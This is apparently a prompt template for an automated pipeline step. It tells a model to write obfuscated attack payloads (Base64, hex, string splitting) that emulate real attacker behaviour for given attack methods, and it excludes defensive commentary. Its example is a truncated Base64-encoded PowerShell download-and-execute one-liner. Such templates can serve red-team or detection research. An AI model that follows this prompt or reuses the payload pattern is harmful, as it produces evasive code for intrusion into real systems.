<task>Simulate adversarial payload generation for each provided attack method using shell code or scripts.</task>
<instruction>Based on the list of inferred attack methods from the previous analysis step, create a plausible shell code or script snippet for each method that emulates real-world attacker behavior.</instruction>
<dos>– Use obfuscation techniques such as Base64 encoding, hex encoding, string splitting, or environment variables.
– Align each payload closely with the described attack method.
– Format code in readable code blocks and include comments where helpful.</dos>
<donts>– Do not produce actual malware binaries or irreversible destructive commands.
– Do not include instructions for real deployment or execution.
– Do not mix in defensive advice or unrelated commentary.</donts>
<example>For "Base64-encoded PowerShell download and execute":

powershell
Copy
Edit
$e='JABXAB0APQAoACIA...=='; IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e)))
This simulates an in-memory download and execution of a remote payload via obfuscated PowerShell.</example>
